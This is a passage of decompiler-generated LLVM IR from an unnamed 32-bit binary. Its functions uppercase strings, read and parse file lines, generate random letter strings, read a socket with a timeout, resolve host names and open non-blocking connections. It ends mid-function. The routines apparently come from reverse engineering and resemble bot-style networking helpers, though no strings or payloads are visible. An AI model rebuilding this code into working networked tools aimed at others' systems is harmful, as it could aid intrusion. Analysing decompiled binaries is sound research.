  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_9b98 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_9b98 to i8*
  %v2_9bd03 = load i8, i8* %storemerge2, align 1
  %v2_9bd45 = icmp eq i8 %v2_9bd03, 0
  br i1 %v2_9bd45, label %dec_label_pc_9bdc, label %dec_label_pc_9ba0

dec_label_pc_9ba0:                                ; preds = %dec_label_pc_9b88, %dec_label_pc_9ba0
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_9ba0 ], [ %storemerge2, %dec_label_pc_9b88 ]
  %storemerge.in6 = phi i32 [ %v1_9bc4, %dec_label_pc_9ba0 ], [ %v0_9b98, %dec_label_pc_9b88 ]
  %v2_9ba4 = load i8, i8* %storemerge7, align 1
  %v3_9ba4 = zext i8 %v2_9ba4 to i32
  store i32 %v3_9ba4, i32* %r0.global-to-local, align 4
  %v1_9bac = call i32 @function_12af4(i32 %v3_9ba4)
  store i32 %v1_9bac, i32* %r0.global-to-local, align 4
  %v1_9bbc = trunc i32 %v1_9bac to i8
  store i8 %v1_9bbc, i8* %storemerge7, align 1
  %v1_9bc4 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_9bc4 to i8*
  %v2_9bd0 = load i8, i8* %storemerge, align 1
  %v2_9bd4 = icmp eq i8 %v2_9bd0, 0
  br i1 %v2_9bd4, label %dec_label_pc_9bcc.dec_label_pc_9bdc_crit_edge, label %dec_label_pc_9ba0

dec_label_pc_9bcc.dec_label_pc_9bdc_crit_edge:    ; preds = %dec_label_pc_9ba0
  %v1_9be4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9bdc

dec_label_pc_9bdc:                                ; preds = %dec_label_pc_9bcc.dec_label_pc_9bdc_crit_edge, %dec_label_pc_9b88
  %v1_9be4 = phi i32 [ %v1_9be4.pre, %dec_label_pc_9bcc.dec_label_pc_9bdc_crit_edge ], [ %v0_9b98, %dec_label_pc_9b88 ]
  ret i32 %v1_9be4

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_9bc4, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v0_9b98, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_9ba0, { 1, 0 }
}

define i32 @function_9be8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_9be8:
  %stack_var_-4128 = alloca i32, align 4
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 -4108, i32* @r3, align 4
  %v2_9c04 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_9c04, i32* @r2, align 4
  %v3_9c14 = call i32 @function_125b4(i32 ptrtoint ([14 x i8]* @global_var_212ec.29 to i32), i32 0)
  %v2_9dcc = ptrtoint i32* %stack_var_-4128 to i32
  %v1_9c34 = bitcast i32* %stack_var_-4128 to i8*
  br label %dec_label_pc_9dc4

dec_label_pc_9c24:                                ; preds = %dec_label_pc_9dc4
  %v2_9c34 = call i32 @function_9b88(i8* %v1_9c34)
  %v4_9c4c = call i32 @function_14020(i32 %v2_9dcc, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_212fc.31, i32 0, i32 0))
  %v9_9c64 = icmp eq i32 %v4_9c4c, %v2_9dcc
  br i1 %v9_9c64, label %dec_label_pc_9c6c, label %dec_label_pc_9da8

dec_label_pc_9c6c:                                ; preds = %dec_label_pc_9c24
  %tmp21 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_9c90

dec_label_pc_9c84:                                ; preds = %dec_label_pc_9cb0, %dec_label_pc_9ca0, %dec_label_pc_9c90
  %v1_9c88 = add i32 %v4_9c90, 1
  %v5_9c8c = inttoptr i32 %v1_9c88 to i8*
  br label %dec_label_pc_9c90

dec_label_pc_9c90:                                ; preds = %dec_label_pc_9c6c, %dec_label_pc_9c84
  %storemerge2 = phi i8* [ %v5_9c8c, %dec_label_pc_9c84 ], [ %tmp21, %dec_label_pc_9c6c ]
  %v4_9c90 = ptrtoint i8* %storemerge2 to i32
  %v2_9c94 = load i8, i8* %storemerge2, align 1
  %v7_9c98 = icmp eq i8 %v2_9c94, 32
  br i1 %v7_9c98, label %dec_label_pc_9c84, label %dec_label_pc_9ca0

dec_label_pc_9ca0:                                ; preds = %dec_label_pc_9c90
  %v2_9ca4 = load i8, i8* %storemerge2, align 1
  %v7_9ca8 = icmp eq i8 %v2_9ca4, 9
  br i1 %v7_9ca8, label %dec_label_pc_9c84, label %dec_label_pc_9cb0

dec_label_pc_9cb0:                                ; preds = %dec_label_pc_9ca0
  %v2_9cb4 = load i8, i8* %storemerge2, align 1
  %v7_9cb8 = icmp eq i8 %v2_9cb4, 58
  br i1 %v7_9cb8, label %dec_label_pc_9c84, label %dec_label_pc_9ce8.preheader

dec_label_pc_9ce8.preheader:                      ; preds = %dec_label_pc_9cb0
  %v1_9cec = add i32 %v4_9c90, -1
  br label %dec_label_pc_9ce8

dec_label_pc_9cc4:                                ; preds = %dec_label_pc_9ce8, %dec_label_pc_9d10
  store i32 %v4_9c90, i32* @r0, align 4
  %v0_9cd4 = call i32 @function_13f70()
  %v2_9cdc = add i32 %v1_9cec, %v0_9cd4
  %v3_9ce4 = inttoptr i32 %v2_9cdc to i8*
  store i8 0, i8* %v3_9ce4, align 1
  br label %dec_label_pc_9ce8

dec_label_pc_9ce8:                                ; preds = %dec_label_pc_9ce8.preheader, %dec_label_pc_9cc4
  store i32 %v4_9c90, i32* @r0, align 4
  %v0_9cf8 = call i32 @function_13f70()
  %v2_9d00 = add i32 %v1_9cec, %v0_9cf8
  %v1_9d04 = inttoptr i32 %v2_9d00 to i8*
  %v2_9d04 = load i8, i8* %v1_9d04, align 1
  %v7_9d08 = icmp eq i8 %v2_9d04, 13
  br i1 %v7_9d08, label %dec_label_pc_9cc4, label %dec_label_pc_9d10

dec_label_pc_9d10:                                ; preds = %dec_label_pc_9ce8
  store i32 %v1_9cec, i32* @r4, align 4
  store i32 %v4_9c90, i32* @r0, align 4
  %v0_9d20 = call i32 @function_13f70()
  %v0_9d28 = load i32, i32* @r4, align 4
  %v2_9d28 = add i32 %v0_9d28, %v0_9d20
  %v1_9d2c = inttoptr i32 %v2_9d28 to i8*
  %v2_9d2c = load i8, i8* %v1_9d2c, align 1
  %v7_9d30 = icmp eq i8 %v2_9d2c, 10
  br i1 %v7_9d30, label %dec_label_pc_9cc4, label %dec_label_pc_9d38

dec_label_pc_9d38:                                ; preds = %dec_label_pc_9d10
  store i32 %v4_9c90, i32* @r0, align 4
  %v2_9d44 = call i32 @function_142f0(i32 %v4_9c90, i32 46)
  %v2_9d4c = icmp eq i32 %v2_9d44, 0
  br i1 %v2_9d4c, label %dec_label_pc_9d70, label %dec_label_pc_9d54

dec_label_pc_9d54:                                ; preds = %dec_label_pc_9d38
  store i32 %v4_9c90, i32* @r0, align 4
  %v2_9d60 = call i32 @function_142f0(i32 %v4_9c90, i32 46)
  %v3_9d6c = inttoptr i32 %v2_9d60 to i8*
  store i8 0, i8* %v3_9d6c, align 1
  br label %dec_label_pc_9d70

dec_label_pc_9d70:                                ; preds = %dec_label_pc_9d38, %dec_label_pc_9d54
  store i32 %v4_9c90, i32* @r1, align 4
  %v2_9d8c = inttoptr i32 %arg1 to i8*
  %v3_9d8c = call i32 @function_14210(i8* %v2_9d8c, i32 %v4_9c90)
  %v1_9d94 = call i32 @function_12a98(i32 %v3_9c14)
  br label %dec_label_pc_9e00

dec_label_pc_9da8:                                ; preds = %dec_label_pc_9c24
  store i32 4096, i32* @r2, align 4
  %v3_9dc0 = call i32 @function_13ed0(i8* %v1_9c34, i32 0)
  br label %dec_label_pc_9dc4

dec_label_pc_9dc4:                                ; preds = %dec_label_pc_9be8, %dec_label_pc_9da8
  %v4_9ddc = call i32 @function_981c(i32 %v2_9dcc, i32 4096, i32 %v3_9c14, i32 %v2_9dcc)
  %v2_9de4 = icmp eq i32 %v4_9ddc, 0
  br i1 %v2_9de4, label %dec_label_pc_9dec, label %dec_label_pc_9c24

dec_label_pc_9dec:                                ; preds = %dec_label_pc_9dc4
  %v1_9df0 = call i32 @function_12a98(i32 %v3_9c14)
  br label %dec_label_pc_9e00

dec_label_pc_9e00:                                ; preds = %dec_label_pc_9d70, %dec_label_pc_9dec
  %storemerge4 = phi i32 [ 1, %dec_label_pc_9dec ], [ 0, %dec_label_pc_9d70 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v1_9cec, { 2, 1, 0 }
  uselistorder i32 %v4_9c90, { 3, 2, 1, 0, 5, 4, 6, 9, 7, 8, 10 }
  uselistorder i8* %storemerge2, { 0, 1, 3, 2 }
  uselistorder i32 %v2_9dcc, { 0, 3, 1, 2 }
  uselistorder i32 %v3_9c14, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9e00, { 1, 0 }
  uselistorder label %dec_label_pc_9dc4, { 1, 0 }
  uselistorder label %dec_label_pc_9d70, { 1, 0 }
  uselistorder label %dec_label_pc_9ce8, { 1, 0 }
  uselistorder label %dec_label_pc_9cc4, { 1, 0 }
  uselistorder label %dec_label_pc_9c90, { 1, 0 }
}

define i32 @function_9e20(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_9e20:
  store i32 %arg2, i32* @r2, align 4
  %stack_var_-4120 = alloca i32, align 4
  %v2_9e30 = ptrtoint i32* %stack_var_-4120 to i32
  store i32 0, i32* @r3, align 4
  %v3_9e44 = call i32 @function_125b4(i32 ptrtoint ([14 x i8]* @global_var_212ec.29 to i32), i32 0)
  %v1_9e64 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_9ec0

dec_label_pc_9e54:                                ; preds = %dec_label_pc_9ec0
  %v2_9e64 = call i32 @function_9b88(i8* %v1_9e64)
  %v4_9e7c = call i32 @function_14020(i32 %v2_9e30, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_212fc.31, i32 0, i32 0))
  %v9_9e90 = icmp eq i32 %v4_9e7c, %v2_9e30
  br i1 %v9_9e90, label %dec_label_pc_9e98, label %dec_label_pc_9ea4

dec_label_pc_9e98:                                ; preds = %dec_label_pc_9e54
  %v1_9e9c = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_9ea4

dec_label_pc_9ea4:                                ; preds = %dec_label_pc_9e54, %dec_label_pc_9e98
  %stack_var_-24.0 = phi i32 [ %v1_9e9c, %dec_label_pc_9e98 ], [ %stack_var_-24.1, %dec_label_pc_9e54 ]
  store i32 4096, i32* @r2, align 4
  %v3_9ebc = call i32 @function_13ed0(i8* %v1_9e64, i32 0)
  br label %dec_label_pc_9ec0

dec_label_pc_9ec0:                                ; preds = %dec_label_pc_9e20, %dec_label_pc_9ea4
  %stack_var_-24.1 = phi i32 [ 0, %dec_label_pc_9e20 ], [ %stack_var_-24.0, %dec_label_pc_9ea4 ]
  %v4_9ed8 = call i32 @function_981c(i32 %v2_9e30, i32 4096, i32 %v3_9e44, i32 %v2_9e30)
  %v2_9ee0 = icmp eq i32 %v4_9ed8, 0
  br i1 %v2_9ee0, label %dec_label_pc_9ee8, label %dec_label_pc_9e54

dec_label_pc_9ee8:                                ; preds = %dec_label_pc_9ec0
  %v1_9eec = call i32 @function_12a98(i32 %v3_9e44)
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 0, 2, 1 }
  uselistorder i32 %v2_9e30, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_9ec0, { 1, 0 }
  uselistorder label %dec_label_pc_9ea4, { 1, 0 }
}

define i32 @function_9f0c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_9f0c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_9f1c = load i32, i32* %r0.global-to-local, align 4
  %v5_9fb024 = icmp sgt i32 %arg2, 0
  br i1 %v5_9fb024, label %dec_label_pc_9f38, label %dec_label_pc_9fb4

dec_label_pc_9f38:                                ; preds = %dec_label_pc_9f0c, %dec_label_pc_9f38
  %storemerge725 = phi i32 [ %v1_9f9c, %dec_label_pc_9f38 ], [ 0, %dec_label_pc_9f0c ]
  %v2_9f44 = add i32 %storemerge725, %v0_9f1c
  store i32 %v2_9f44, i32* @r4, align 4
  %v0_9f48 = call i32 @function_83f0()
  store i32 %v0_9f48, i32* %r0.global-to-local, align 4
  %v3_9f58 = udiv i32 %v0_9f48, 26
  %tmp = mul nsw i32 %v3_9f58, -2
  %v2_9f7c = add i32 %v0_9f48, %tmp
  %fold = add i32 %v2_9f7c, 65
  %v1_9f94 = trunc i32 %fold to i8
  %v2_9f94 = load i32, i32* @r4, align 4
  %v3_9f94 = inttoptr i32 %v2_9f94 to i8*
  store i8 %v1_9f94, i8* %v3_9f94, align 1
  %v1_9f9c = add nuw nsw i32 %storemerge725, 1
  %v5_9fb0 = icmp slt i32 %v1_9f9c, %arg2
  br i1 %v5_9fb0, label %dec_label_pc_9f38, label %dec_label_pc_9fa4.dec_label_pc_9fb4_crit_edge

dec_label_pc_9fa4.dec_label_pc_9fb4_crit_edge:    ; preds = %dec_label_pc_9f38
  %v1_9fbc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9fb4

dec_label_pc_9fb4:                                ; preds = %dec_label_pc_9fa4.dec_label_pc_9fb4_crit_edge, %dec_label_pc_9f0c
  %v1_9fbc = phi i32 [ %v1_9fbc.pre, %dec_label_pc_9fa4.dec_label_pc_9fb4_crit_edge ], [ %v0_9f1c, %dec_label_pc_9f0c ]
  ret i32 %v1_9fbc

; uselistorder directives
  uselistorder i32 %v1_9f9c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9f38, { 1, 0 }
}

define i32 @function_9fc4(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a018.lr.ph:
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9fc8 = load i32, i32* @fp, align 4
  store i32 %v3_9fc8, i32* %stack_var_-16, align 4
  store i32 40912, i32* %stack_var_-4, align 4
  %v2_9fcc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9fcc, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_9ff0 = call i32 @function_13ed0(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_a004 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_a018

dec_label_pc_a018:                                ; preds = %dec_label_pc_a018.lr.ph, %dec_label_pc_a018
  %storemerge527 = phi i32 [ 0, %dec_label_pc_a018.lr.ph ], [ %v1_a02c, %dec_label_pc_a018 ]
  %v5_a024 = mul nuw nsw i32 %storemerge527, 4
  %v6_a024 = add i32 %v5_a024, %v2_a004
  %v7_a024 = inttoptr i32 %v6_a024 to i32*
  store i32 0, i32* %v7_a024, align 4
  %v1_a02c = add nuw nsw i32 %storemerge527, 1
  %tmp52 = icmp ult i32 %v1_a02c, 32
  br i1 %tmp52, label %dec_label_pc_a018, label %dec_label_pc_a040

dec_label_pc_a040:                                ; preds = %dec_label_pc_a018
  %v13_9fc8 = ptrtoint i32* %stack_var_-16 to i32
  %v3_a044 = udiv i32 %arg1, 32
  %v3_a050 = mul nuw nsw i32 %v3_a044, 4
  %v2_a058 = add nsw i32 %v3_a050, -160
  %v2_a05c = add i32 %v2_a058, %v13_9fc8
  %v1_a060 = inttoptr i32 %v2_a05c to i32*
  %v2_a060 = load i32, i32* %v1_a060, align 4
  %v1_a068 = urem i32 %arg1, 32
  %v6_a070 = shl i32 1, %v1_a068
  %v2_a074 = or i32 %v2_a060, %v6_a070
  store i32 %v2_a074, i32* %v1_a060, align 4
  %v1_a094 = add i32 %arg1, 1
  %v2_a0a0 = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_a0b4 = call i32 @function_12764(i32 %v1_a094, i32 %v2_a004, i32 0, i32 %v2_a004, i32 %v2_a0a0)
  %v5_a0c8 = icmp sgt i32 %v5_a0b4, 0
  br i1 %v5_a0c8, label %dec_label_pc_a25c.preheader, label %dec_label_pc_a1c8.preheader

dec_label_pc_a1c8.preheader:                      ; preds = %dec_label_pc_a040
  %v7_a1d023 = icmp slt i32 %tmp33, 10
  br i1 %v7_a1d023, label %dec_label_pc_a108.lr.ph, label %dec_label_pc_a25c.preheader

dec_label_pc_a108.lr.ph:                          ; preds = %dec_label_pc_a1c8.preheader, %dec_label_pc_a1bc
  %stack_var_-44.024 = phi i32 [ %v1_a1c0, %dec_label_pc_a1bc ], [ %tmp33, %dec_label_pc_a1c8.preheader ]
  %v2_a0d4 = load i32, i32* @global_var_2c890.36, align 4
  %v3_a0e0 = call i32 @function_9340(i32 %v2_a0d4, i32 ptrtoint ([5 x i8]* @global_var_21308.38 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_a108

dec_label_pc_a108:                                ; preds = %dec_label_pc_a108.lr.ph, %dec_label_pc_a108
  %storemerge615 = phi i32 [ 0, %dec_label_pc_a108.lr.ph ], [ %v1_a11c, %dec_label_pc_a108 ]
  %v5_a114 = mul nuw nsw i32 %storemerge615, 4
  %v6_a114 = add i32 %v5_a114, %v2_a004
  %v7_a114 = inttoptr i32 %v6_a114 to i32*
  store i32 0, i32* %v7_a114, align 4
  %v1_a11c = add nuw nsw i32 %storemerge615, 1
  %tmp53 = icmp ult i32 %v1_a11c, 32
  br i1 %tmp53, label %dec_label_pc_a108, label %dec_label_pc_a130

dec_label_pc_a130:                                ; preds = %dec_label_pc_a108
  %v2_a150 = load i32, i32* %v1_a060, align 4
  %v2_a164 = or i32 %v2_a150, %v6_a070
  store i32 %v2_a164, i32* %v1_a060, align 4
  store i32 0, i32* @r2, align 4
  %v5_a1a4 = call i32 @function_12764(i32 %v1_a094, i32 %v2_a004, i32 0, i32 %v2_a004, i32 %v2_a0a0)
  %v5_a1b8 = icmp sgt i32 %v5_a1a4, 0
  br i1 %v5_a1b8, label %dec_label_pc_a25c.preheader, label %dec_label_pc_a1bc

dec_label_pc_a1bc:                                ; preds = %dec_label_pc_a130
  %v1_a1c0 = add nsw i32 %stack_var_-44.024, 1
  %v7_a1d0 = icmp slt i32 %v1_a1c0, 10
  br i1 %v7_a1d0, label %dec_label_pc_a108.lr.ph, label %dec_label_pc_a25c.preheader

dec_label_pc_a25c.preheader:                      ; preds = %dec_label_pc_a1bc, %dec_label_pc_a130, %dec_label_pc_a1c8.preheader, %dec_label_pc_a040
  %v2_a1f0 = ptrtoint i8* %stack_var_-185 to i32
  %not.v7_a26457 = icmp sgt i32 %arg3, 1
  %v2_a27c59 = icmp eq i1 %not.v7_a26457, false
  br i1 %v2_a27c59, label %dec_label_pc_a284, label %dec_label_pc_a1e8

dec_label_pc_a1e8:                                ; preds = %dec_label_pc_a25c.preheader, %dec_label_pc_a250
  %v1_a26062.in = phi i32 [ %v1_a26062, %dec_label_pc_a250 ], [ %arg3, %dec_label_pc_a25c.preheader ]
  %stack_var_-40.061 = phi i8* [ %v5_a240, %dec_label_pc_a250 ], [ %arg2, %dec_label_pc_a25c.preheader ]
  %stack_var_-36.060 = phi i32 [ %v1_a254, %dec_label_pc_a250 ], [ 0, %dec_label_pc_a25c.preheader ]
  %v1_a26062 = add i32 %v1_a26062.in, -1
  %v2_a1ec = load i32, i32* @global_var_2c890.36, align 4
  %v5_a204 = call i32 @function_14990(i32 %v2_a1ec, i32 %v2_a1f0, i32 1, i32 0)
  %v7_a20c = icmp eq i32 %v5_a204, 1
  br i1 %v7_a20c, label %dec_label_pc_a22c, label %dec_label_pc_a214

dec_label_pc_a214:                                ; preds = %dec_label_pc_a1e8
  store i8 0, i8* %stack_var_-40.061, align 1
  br label %dec_label_pc_a298

dec_label_pc_a22c:                                ; preds = %dec_label_pc_a1e8
  %v3_a22c = load i8, i8* %stack_var_-185, align 1
  %v4_a230 = ptrtoint i8* %stack_var_-40.061 to i32
  store i8 %v3_a22c, i8* %stack_var_-40.061, align 1
  %v1_a23c = add i32 %v4_a230, 1
  %v5_a240 = inttoptr i32 %v1_a23c to i8*
  %v3_a244 = load i8, i8* %stack_var_-185, align 1
  %v7_a248 = icmp eq i8 %v3_a244, 10
  br i1 %v7_a248, label %dec_label_pc_a284, label %dec_label_pc_a250

dec_label_pc_a250:                                ; preds = %dec_label_pc_a22c
  %v1_a254 = add i32 %stack_var_-36.060, 1
  %not.v7_a264 = icmp sgt i32 %v1_a26062, 1
  %v2_a27c = icmp eq i1 %not.v7_a264, false
  br i1 %v2_a27c, label %dec_label_pc_a284, label %dec_label_pc_a1e8

dec_label_pc_a284:                                ; preds = %dec_label_pc_a22c, %dec_label_pc_a250, %dec_label_pc_a25c.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_a25c.preheader ], [ %v1_a254, %dec_label_pc_a250 ], [ %stack_var_-36.060, %dec_label_pc_a22c ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_a25c.preheader ], [ %v5_a240, %dec_label_pc_a250 ], [ %v5_a240, %dec_label_pc_a22c ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_a298

dec_label_pc_a298:                                ; preds = %dec_label_pc_a214, %dec_label_pc_a284
  %storemerge = phi i32 [ -1, %dec_label_pc_a214 ], [ %stack_var_-36.0.lcssa, %dec_label_pc_a284 ]
  %v2_a2a4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_a2a4, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-40.061, { 1, 2, 0 }
  uselistorder i32 %v1_a1c0, { 1, 0 }
  uselistorder i32 %storemerge615, { 1, 0 }
  uselistorder i32 %storemerge527, { 1, 0 }
  uselistorder i32 %v2_a004, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a298, { 1, 0 }
  uselistorder label %dec_label_pc_a284, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a1e8, { 1, 0 }
  uselistorder label %dec_label_pc_a108, { 1, 0 }
  uselistorder label %dec_label_pc_a108.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_a018, { 1, 0 }
}

define i32 @function_a2b4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a2b4:
  %stack_var_-4 = alloca i32, align 4
  store i32 41664, i32* %stack_var_-4, align 4
  %v2_a2bc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a2bc, i32* @fp, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_a2d0 = call i32 @function_14858(i32 %arg1)
  %v2_a2e0 = icmp eq i32 %v1_a2d0, 0
  br i1 %v2_a2e0, label %dec_label_pc_a2e8, label %dec_label_pc_a2fc

dec_label_pc_a2e8:                                ; preds = %dec_label_pc_a2b4
  %v3_a2ec = call i32 @function_146e8(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_21310.40, i32 0, i32 0))
  br label %dec_label_pc_a374

dec_label_pc_a2fc:                                ; preds = %dec_label_pc_a2b4
  %v1_a300 = add i32 %v1_a2d0, 16
  %v2_a300 = inttoptr i32 %v1_a300 to i32*
  %v3_a300 = load i32, i32* %v2_a300, align 4
  %v1_a324 = inttoptr i32 %v3_a300 to i32*
  %v2_a324 = load i32, i32* %v1_a324, align 4
  %v2_a328 = icmp eq i32 %v2_a324, 0
  br i1 %v2_a328, label %dec_label_pc_a36c, label %dec_label_pc_a330

dec_label_pc_a330:                                ; preds = %dec_label_pc_a2fc
  %v2_a344 = load i32, i32* %v1_a324, align 4
  %v1_a348 = inttoptr i32 %v2_a344 to i32*
  %v2_a348 = load i32, i32* %v1_a348, align 4
  store i32 %v2_a348, i32* @r0, align 4
  %v1_a34c = call i32 @function_14814(i32 %v2_a348)
  store i32 %v1_a34c, i32* @r1, align 4
  %v2_a35c = inttoptr i32 %arg2 to i8*
  %v3_a35c = call i32 @function_14210(i8* %v2_a35c, i32 %v1_a34c)
  br label %dec_label_pc_a374

dec_label_pc_a36c:                                ; preds = %dec_label_pc_a2fc
  br label %dec_label_pc_a374

dec_label_pc_a374:                                ; preds = %dec_label_pc_a330, %dec_label_pc_a2e8, %dec_label_pc_a36c
  %stack_var_-44.0 = phi i32 [ 1, %dec_label_pc_a2e8 ], [ 1, %dec_label_pc_a36c ], [ 0, %dec_label_pc_a330 ]
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a374, { 2, 0, 1 }
}

define i32 @function_a38c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a38c:
  store i32 %arg4, i32* @r3, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a390 = load i32, i32* @fp, align 4
  store i32 %v3_a390, i32* %stack_var_-16, align 4
  %v13_a390 = ptrtoint i32* %stack_var_-16 to i32
  %v2_a3b8 = call i32 @function_128a0(i32 %arg1, i32 3)
  %v1_a3c8 = or i32 %v2_a3b8, 2048
  store i32 %v1_a3c8, i32* @r3, align 4
  %v2_a3dc = call i32 @function_128a0(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_a3f0 = urem i32 %arg3, 65536
  %v1_a3f8 = call i32 @function_1464c(i32 %v3_a3f0)
  %v3_a418 = call i32 @function_9b20(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_a420 = icmp eq i32 %v3_a418, 0
  br i1 %v2_a420, label %dec_label_pc_a434, label %dec_label_pc_a428

dec_label_pc_a428:                                ; preds = %dec_label_pc_a38c
  br label %dec_label_pc_a5ec

dec_label_pc_a434:                                ; preds = %dec_label_pc_a38c
  store i32 8, i32* @r2, align 4
  %v2_a448 = bitcast i32* %stack_var_-40 to i8*
  %v3_a448 = call i32 @function_13ed0(i8* %v2_a448, i32 0)
  %v2_a44c = ptrtoint i32* %stack_var_-48 to i32
  %v3_a45c = call i32 @function_148dc(i32 %arg1, i32 %v2_a44c, i32 16)
  store i32 %v3_a45c, i32* @r3, align 4
  %v1_a46c = icmp slt i32 %v3_a45c, 0
  br i1 %v1_a46c, label %dec_label_pc_a474, label %dec_label_pc_a5b0

dec_label_pc_a474:                                ; preds = %dec_label_pc_a434
  %v0_a474 = call i32 @function_12b24()
  %v1_a47c = inttoptr i32 %v0_a474 to i32*
  %v2_a47c = load i32, i32* %v1_a47c, align 4
  %v7_a480 = icmp eq i32 %v2_a47c, 115
  br i1 %v7_a480, label %dec_label_pc_a4ac.lr.ph, label %dec_label_pc_a5a4

dec_label_pc_a4ac.lr.ph:                          ; preds = %dec_label_pc_a474
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_a498 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_a4ac

dec_label_pc_a4ac:                                ; preds = %dec_label_pc_a4ac.lr.ph, %dec_label_pc_a4ac
  %storemerge14 = phi i32 [ 0, %dec_label_pc_a4ac.lr.ph ], [ %v1_a4c0, %dec_label_pc_a4ac ]
  %v5_a4b8 = mul nuw nsw i32 %storemerge14, 4
  %v6_a4b8 = add i32 %v5_a4b8, %v2_a498
  %v7_a4b8 = inttoptr i32 %v6_a4b8 to i32*
  store i32 0, i32* %v7_a4b8, align 4
  %v1_a4c0 = add nuw nsw i32 %storemerge14, 1
  %tmp28 = icmp ult i32 %v1_a4c0, 32
  br i1 %tmp28, label %dec_label_pc_a4ac, label %dec_label_pc_a4d4

dec_label_pc_a4d4:                                ; preds = %dec_label_pc_a4ac
  %v3_a4d8 = udiv i32 %arg1, 32
  %v3_a4e4 = mul nuw nsw i32 %v3_a4d8, 4
  %v2_a4ec = add nsw i32 %v3_a4e4, -160
  %v2_a4f0 = add i32 %v2_a4ec, %v13_a390
  %v1_a4f4 = inttoptr i32 %v2_a4f0 to i32*
  %v2_a4f4 = load i32, i32* %v1_a4f4, align 4
  %v1_a4fc = urem i32 %arg1, 32
  %v6_a504 = shl i32 1, %v1_a4fc
  %v2_a508 = or i32 %v2_a4f4, %v6_a504
  store i32 %v2_a508, i32* %v1_a4f4, align 4
  %v1_a528 = add i32 %arg1, 1
  %v2_a530 = ptrtoint i32* %stack_var_-184 to i32
  %v5_a548 = call i32 @function_12764(i32 %v1_a528, i32 0, i32 %v2_a498, i32 0, i32 %v2_a530)
  %tmp29 = icmp slt i32 %v5_a548, 1
  br i1 %tmp29, label %dec_label_pc_a598, label %dec_label_pc_a558

dec_label_pc_a558:                                ; preds = %dec_label_pc_a4d4
